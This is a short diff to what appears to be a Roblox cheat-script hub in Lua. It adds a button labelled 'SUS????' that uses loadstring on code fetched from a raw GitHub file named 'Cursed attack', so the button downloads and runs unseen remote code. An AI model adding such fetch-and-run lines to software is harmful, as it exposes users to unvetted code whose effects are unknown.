@@ -421,3 +421,10 @@ local Button = Tab:CreateButton({
 		end
 		te = nil
 end})
+
+local Button = Tab:CreateButton({
+ Name = "SUS????",
+ Callback = function()
+        loadstring(game:HttpGet("https://raw.githubusercontent.com/IFeelPower/Battle/refs/heads/main/Cursed%20attack"))()
+   end    
+})
